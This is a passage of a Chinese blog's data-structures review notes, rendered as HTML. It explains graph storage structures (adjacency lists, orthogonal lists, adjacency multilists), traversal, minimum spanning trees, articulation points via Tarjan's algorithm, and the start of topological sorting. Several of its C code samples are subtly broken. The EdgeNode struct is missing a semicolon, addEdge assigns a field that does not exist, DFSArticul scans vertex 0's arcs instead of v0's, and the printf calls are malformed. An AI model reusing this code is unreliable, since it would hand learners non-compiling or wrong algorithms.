src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604163216567.png" class="" alt="image-20240604163216567" loading="lazy"><h4 id="邻接表逆邻接表顺序链式"><a class="markdownIt-Anchor" href="#邻接表逆邻接表顺序链式"></a> 邻接表/逆邻接表（顺序+链式)</h4><ul><li><p>无向图的邻接表</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604163306284.png" class="" alt="image-20240604163306284" loading="lazy"></li><li><p>有向图的邻接表</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604163357340.png" class="" alt="image-20240604163357340" loading="lazy"></li><li><p>有向网的邻接表</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604163458053.png" class="" alt="image-20240604163458053" loading="lazy"></li><li><p>有向图的逆邻接表</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604163626509.png" class="" alt="image-20240604163626509" loading="lazy"></li></ul><h4 id="十字链表"><a class="markdownIt-Anchor" href="#十字链表"></a> 十字链表</h4><ul><li><p><mark>有向图</mark>的十字链表</p><p><mark>将邻接表和逆邻接表给合并起来的链表</mark>，使计算度数更加方便</p><p>十字链表的数据结构：主要由顶点表数组</p><p>顶点结构如下<code>data | firstIn | firstOut</code></p><p>其中data表示顶点的具体数据信息，而firstIn则表示指向以该顶点为弧头的第一个弧节点。而firstOut则表示指向以该节点为弧尾的第一个弧节点，采用一个顶点数组存储每一个节点</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604204936964.png" class="" alt="image-20240604204936964" loading="lazy"><p>在十字链表结构中，有向图中的每一条弧都有一个弧节点与之对应，具体的弧节点结构如下所示</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604205039448.png" class="" alt="image-20240604205039448" loading="lazy"><p>其中的<code>tailVex</code>表示<code>该弧的弧尾顶点在顶点数组xList中的位置</code>，<code>headVex</code>表示该<code>弧的弧头顶点在顶点数组中的位置</code>。<code>hLink则表示指向弧头相同的下一条弧</code>，<code>tLink则表示指向弧尾相同的下一条弧</code>。</p><p>从十字链表的数据结构来看，每一个顶点对应两个链表：以该顶点为弧尾的弧结点所组成的链表以及以该顶点为弧头的弧结点所组成的链表。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 边表节点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">ArcNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> tailvex<span class="token punctuation">;</span>                <span class="token comment">// 该边的起始顶点</span>    <span class="token keyword">int</span> headvex<span class="token punctuation">;</span>                <span class="token comment">// 该边的终止顶点</span>    <span class="token keyword">struct</span> <span class="token class-name">ArcNode</span><span class="token operator">*</span> hlink<span class="token punctuation">;</span>      <span class="token comment">// 指向下一个以该节点为终点的边（逆邻接表）</span>    <span class="token keyword">struct</span> <span class="token class-name">ArcNode</span><span class="token operator">*</span> tlink<span class="token punctuation">;</span>      <span class="token comment">// 指向下一个以该节点为起点的边（邻接表）</span><span class="token punctuation">&#125;</span> ArcNode<span class="token punctuation">;</span><span class="token comment">// 顶点表节点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">VexNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>                   <span class="token comment">// 顶点的数据</span>    ArcNode<span class="token operator">*</span> firstin<span class="token punctuation">;</span>           <span class="token comment">// 指向第一个以该顶点为终点的边</span>    ArcNode<span class="token operator">*</span> firstout<span class="token punctuation">;</span>          <span class="token comment">// 指向第一个以该顶点为起点的边</span><span class="token punctuation">&#125;</span> VexNode<span class="token punctuation">;</span><span class="token comment">// 图的定义</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    VexNode<span class="token operator">*</span> vertices<span class="token punctuation">;</span>          <span class="token comment">// 顶点表数组</span>    <span class="token keyword">int</span> numVertices<span class="token punctuation">;</span>            <span class="token comment">// 顶点数</span>    <span class="token keyword">int</span> numEdges<span class="token punctuation">;</span>               <span class="token comment">// 边数</span><span class="token punctuation">&#125;</span> GraphOrthogonalList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>例如，对于如下所示的一个有向图</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604205241764.png" class="" alt="image-20240604205241764" loading="lazy"><p>构造的十字链表如图</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604205313410.png" class="" alt="image-20240604205313410" loading="lazy"></li></ul><h4 id="邻接多重表"><a class="markdownIt-Anchor" href="#邻接多重表"></a> 邻接多重表</h4><p><mark>无向图</mark>的另一种链式存储结构,<mark>解决了用邻接表重复存储同一条边2次的问题</mark></p><p>同时，解决用邻接矩阵存储时，空间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>V</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(V^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>过大</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604210307737.png" class="" alt="image-20240604210307737" loading="lazy"><p>邻接多重表由顶点表和边表构成<br />顶点表节点：</p><pre class="line-numbers language-none"><code class="language-none">1、data：顶点数据域2、firstedge:边表节点的头指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>边表节点：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">1</span>、ivex<span class="token operator">:</span>该边的第一个端点<span class="token number">2</span>、ilink<span class="token operator">:</span>与该端点相邻的下一个边表节点的指针<span class="token number">3</span>、jvex<span class="token operator">:</span>该边的第二个端点<span class="token number">4</span>、jlink<span class="token operator">:</span>与该端点相邻的下一个边表节点的指针<span class="token number">5</span>、info<span class="token operator">:</span>权值<span class="token number">6</span>、mark<span class="token operator">:</span>标记<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如，对于该无向图</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604212440881.png" class="" alt="image-20240604212440881" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604212402588.png" class="" alt="image-20240604212402588" loading="lazy"><p>如上图所示，图中黄色标记的结点表示A-D之间的边，在邻接表中一条边需要两个结点表示。因此如果对于边的操作（标记或者删除）则需要访问两条链表。</p><p>当采用邻接多重表表示该无向图时,其邻接多重表如下图所示</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604212701365.png" class="" alt="image-20240604212701365" loading="lazy"><p>如上图所示，结点A-D 之间的边，在邻接多重表中只需要一个边结点既可以表示。另外，在该结构中，每个边结点被链入了两个不同的链表。其中A-D之间的边被链入了红色和绿色标记的链表中。如果需要访问一条边，则可以从该边的两个顶点结点中的任何一个出发，遍历依附于该顶点的边构成的链表即可。<code>如果需要删除一条边，则只需要删除一个边结点，但是需要修改这条边依附的两个顶点所对应的链表。另外，需要注意的是，在无向图中，边结点中的iVex和jVex链域与该边所依附的顶点无关，即iVex=0，jVex=3和iVex=3，jVex=0这都表示同一条边A-D，因此这给链表的指针修改带来一定的麻烦。</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 边表节点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">EdgeNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ivex<span class="token punctuation">;</span>                    <span class="token comment">// 该边的一个顶点</span>    <span class="token keyword">int</span> jvex<span class="token punctuation">;</span>                    <span class="token comment">// 该边的另一个顶点</span>    <span class="token keyword">struct</span> <span class="token class-name">EdgeNode</span><span class="token operator">*</span> ilink<span class="token punctuation">;</span>      <span class="token comment">// 指向顶点 ivex 的下一条边</span>    <span class="token keyword">struct</span> <span class="token class-name">EdgeNode</span><span class="token operator">*</span> jlink<span class="token punctuation">;</span>      <span class="token comment">// 指向顶点 jvex 的下一条边</span>    <span class="token keyword">int</span> info    bool mark<span class="token punctuation">;</span>              <span class="token comment">// 标记边是否被访问过（可选）</span><span class="token punctuation">&#125;</span> EdgeNode<span class="token punctuation">;</span><span class="token comment">// 顶点表节点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">VertexNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>                    <span class="token comment">// 顶点数据</span>    EdgeNode<span class="token operator">*</span> firstEdge<span class="token punctuation">;</span>         <span class="token comment">// 指向第一条邻接边</span><span class="token punctuation">&#125;</span> VertexNode<span class="token punctuation">;</span><span class="token comment">// 图的定义</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    VertexNode<span class="token operator">*</span> vertices<span class="token punctuation">;</span>        <span class="token comment">// 顶点表数组</span>    <span class="token keyword">int</span> numVertices<span class="token punctuation">;</span>             <span class="token comment">// 顶点数</span>    <span class="token keyword">int</span> numEdges<span class="token punctuation">;</span>                <span class="token comment">// 边数</span><span class="token punctuation">&#125;</span> GraphAdjMultilist<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addEdge</span><span class="token punctuation">(</span>GraphAdjMultilist<span class="token operator">*</span> graph<span class="token punctuation">,</span> <span class="token keyword">int</span> v1<span class="token punctuation">,</span> <span class="token keyword">int</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    EdgeNode<span class="token operator">*</span> newNode <span class="token operator">=</span> <span class="token punctuation">(</span>EdgeNode<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>EdgeNode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>ivex <span class="token operator">=</span> v1<span class="token punctuation">;</span>    newNode<span class="token operator">-></span>jvex <span class="token operator">=</span> v2<span class="token punctuation">;</span>    newNode<span class="token operator">-></span>isVisited <span class="token operator">=</span> false<span class="token punctuation">;</span>        <span class="token comment">// 插入到顶点 v1 的边表</span>    newNode<span class="token operator">-></span>ilink <span class="token operator">=</span> graph<span class="token operator">-></span>vertices<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">.</span>firstEdge<span class="token punctuation">;</span>    graph<span class="token operator">-></span>vertices<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">.</span>firstEdge <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token comment">// 插入到顶点 v2 的边表</span>    newNode<span class="token operator">-></span>jlink <span class="token operator">=</span> graph<span class="token operator">-></span>vertices<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">.</span>firstEdge<span class="token punctuation">;</span>    graph<span class="token operator">-></span>vertices<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">.</span>firstEdge <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        graph<span class="token operator">-></span>numEdges<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="图的遍历"><a class="markdownIt-Anchor" href="#图的遍历"></a> 图的遍历</h3><h4 id="深度优先搜索"><a class="markdownIt-Anchor" href="#深度优先搜索"></a> 深度优先搜索</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604215847461.png" class="" alt="image-20240604215847461" loading="lazy"><h4 id="广度优先搜索"><a class="markdownIt-Anchor" href="#广度优先搜索"></a> 广度优先搜索</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604215902735.png" class="" alt="image-20240604215902735" loading="lazy"><h3 id="图的连通性问题"><a class="markdownIt-Anchor" href="#图的连通性问题"></a> 图的连通性问题</h3><h4 id="无向图的连通分量和生成树"><a class="markdownIt-Anchor" href="#无向图的连通分量和生成树"></a> 无向图的连通分量和生成树</h4><ul><li><p>DFS生成树</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604215928581.png" class="" alt="image-20240604215928581" loading="lazy"></li><li><p>BFS生成树</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604220105363.png" class="" alt="image-20240604220105363" loading="lazy"></li><li><p>DFS生成树林</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604220148872.png" class="" alt="image-20240604220148872" loading="lazy"></li><li><p>BFS生成树林</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604220231413.png" class="" alt="image-20240604220231413" loading="lazy"></li></ul><h4 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树"></a> 最小生成树</h4><ul><li><h4 id="prim算法"><a class="markdownIt-Anchor" href="#prim算法"></a> Prim算法</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604220717492.png" class="" alt="image-20240604220717492" loading="lazy"></li><li><p><strong>Kruskal</strong>算法</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604220747074.png" class="" alt="image-20240604220747074" loading="lazy"><p>Kruskal算法一般不适合稠密图</p></li></ul><h3 id="关节点和重连通分量"><a class="markdownIt-Anchor" href="#关节点和重连通分量"></a> 关节点和重连通分量</h3><ul><li><p>关节点，假若在删去顶点v以及和v相关联的各边后，将图的一个连通分量分割成两个或两个以上的连通分量，则称顶点为v该图的一个<strong>关节点</strong>，即（割点）</p></li><li><p>一个没有关节点的连通图称为<strong>重连通图</strong></p><p>即从一个双连通图中删去任何一个顶点以及相关联的边，它仍为一个连通图</p></li><li><p><code>visited数组</code></p><p>第一次对图执行深度优先搜索时，依次访问节点，同时按访问顺序对节点编号，对每一个节点v，我们称其先序序号为<code>visited[v]</code></p></li><li><p><code>low数组</code></p><p>对深度优先搜索树上的每一个节点v，计算编号最低的顶点，称之为low[v]</p><p>其意义为:通过该点，经过零条或多条边以及最多一条回边，可以到达的顶点的编号的最小值</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240606221531144.png" class="" alt="image-20240606221531144" loading="lazy"><p>例如，上图中的C点，其先序编号为3，但可首先通过一条边达到D点，并通过D的回边到达A，所以其low数组编号，及可到达的最低节点编号为1。</p><p>顶点的数字标注为visited[v]/low[v]。</p><p><mark>low数组的求法</mark></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mi>i</mi><mi>n</mi><mo stretchy="false">{</mo><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>e</mi><mi>d</mi><mo stretchy="false">[</mo><mi>v</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">[</mo><mi>w</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>e</mi><mi>d</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">low(v)=Min\{visited[v],low[w],visited[k]\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mclose">}</span></span></span></span></p><p>其中顶点<code>w</code>是生成树上顶点v的孩子，顶点<code>k</code>是生成树上和顶点<code>v</code>由回边相联接的祖先，<code>visited</code>记录深度优先遍历时的访问次序</p><blockquote><p>对于任意一个顶点V，其low数组值为自身先序编号(visited[v]),其所有孩子节点的low值的最小值，与其通过回边相连的祖先节点K的先序编号（visited[k]）这三者中的最小值。</p></blockquote></li><li><p><mark>关节点的判定</mark></p><ol><li><p>若生成树中根节点顶点V，其子树大于1，则该节点一定为关节点</p></li><li><p>对于非根节点v，它是割点当且仅当它有某个儿子w，使得low[w]&gt;=visited[v]。该条件在根处总是满足，所以需要进行特别判断</p><blockquote><p>对于low[w]&gt;=visited[v]的理解:Low[w]&gt;=Visited[v]含义为，v有某个孩子w，其可到达的节点的最低先序编号大于等于其父亲的先序编号。即w一定不可能到达比v先序编号低的节点（深度优先搜索中比v先访问的节点），则删除节点v后，w一定不能与v之前的节点相连，则该图不为连通图。</p></blockquote></li></ol></li><li><p>Tarjan算法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FindArticul</span><span class="token punctuation">(</span>ALGraph G<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//连通图G以邻接表作存储结构，查找并输出G上全部关节点。全局量count对访问计数。</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> visited<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">//设定邻接表上0号顶点为生成树的根 </span> <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">.</span>vexnum<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>   <span class="token comment">//其余顶点清零，尚未访问。 </span> visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">=</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>firstarc<span class="token punctuation">;</span>   <span class="token comment">//p为0号顶点指向的第一条依附于它的弧。 </span> v<span class="token operator">=</span>p<span class="token operator">-></span>adjvex<span class="token punctuation">;</span>                <span class="token comment">//v为该弧所指向的顶点的位置。(即树的根结点) </span>  <span class="token function">DFSArticul</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//从第v顶点出发深度优先查找关节点 </span> <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">&lt;</span>G<span class="token punctuation">.</span>vexnum<span class="token punctuation">)</span>           <span class="token comment">//生成树的根至少有两颗子树 </span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//根是关节点，输出 </span>  <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">-></span>nextarc<span class="token punctuation">)</span>         <span class="token comment">//指向下一条弧 </span>  <span class="token punctuation">&#123;</span>   p<span class="token operator">=</span>p<span class="token operator">-></span>nextarc<span class="token punctuation">;</span>   v<span class="token operator">=</span>p<span class="token operator">-></span>adjvex<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>   <span class="token function">DFSArticul</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">DFSArticul</span><span class="token punctuation">(</span>ALGraph G<span class="token punctuation">,</span><span class="token keyword">int</span> v0<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//在深度遍历，标记visited[v]的同时检查关节点 </span> <span class="token comment">//从第v0个顶点出发深度优先遍历图G，查找并输出G上全部关节点。全局count对访问计数。 </span> visited<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token operator">=</span>min<span class="token operator">=</span><span class="token operator">++</span>count<span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>firstarc<span class="token punctuation">;</span>p<span class="token punctuation">;</span>p<span class="token operator">=</span>p<span class="token operator">-></span>nextarc<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//对v0的每个邻接顶点检查 </span>  w<span class="token operator">=</span>p<span class="token operator">-></span>adjvex<span class="token punctuation">;</span>           <span class="token comment">//w为v0邻接顶点</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment">//w未曾访问，是v0的孩子； 注：结点v的low与其孩子有关，所以一定先递归求出节点的所有子树的low值。 </span>  <span class="token punctuation">&#123;</span>   <span class="token function">DFSArticul</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//返回前求得low[w]；</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token operator">&lt;</span>min<span class="token punctuation">)</span>  min<span class="token operator">=</span>low<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token operator">>=</span>visited<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token function">printf</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span>G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出关节点;         </span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token operator">&lt;</span>min<span class="token punctuation">)</span>     <span class="token comment">//不是孩子节点，则为v0节点的祖先（回边） </span>  min<span class="token operator">=</span>visited<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> low<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token operator">=</span>min<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意点：<br />1.搜索树的根节点需要特判<br />2.对于每个顶点V，其low一定要在其所有孩子的low值已知的情况下才能决定，所以在算法中要先递归调用求出所有子树的low值。<br />3.节点孩子的判断方式(w为v的邻接点，且w之前未被访问),<br />回边的判断方式（w为v的邻接点，w已被访问）。<br />4.DFSArticul函数同时实现visited数组的标记，low数组的更新与关节点的判定。</p></blockquote><blockquote><p>时间复杂度分析:<br />Tarjan算法的时间复杂度与图的深度优先遍历复杂度相同，都是对所有顶点与边访问一次，复杂度为O(V+E)。</p></blockquote></li></ul><h3 id="有向无环图"><a class="markdownIt-Anchor" href="#有向无环图"></a> 有向无环图</h3><h4 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序"></a> 拓扑排序</h4><ul><li><p>AOV网(Activity On Vertex network)是以顶点表示活动，弧表示活动之间优先关系的DAG图</p><p>例如</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604221214566.png" class="" alt="image-20240604221214566" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604221235724.png" class="" alt="image-20240604221235724" loading="lazy"></li><li><p>拓扑排序:是有向图的全部顶点的一个线性序列，该序列保持了原有向图中由各顶点间的相对次数</p><p><mark>算法过程</mark></p><ol><li>在有向图中选一个没有前驱的顶点输出(选择入度为0的顶点)</li><li>在图中删除该顶点和所有以它为尾的弧（修改其他顶点入度)</li></ol><img 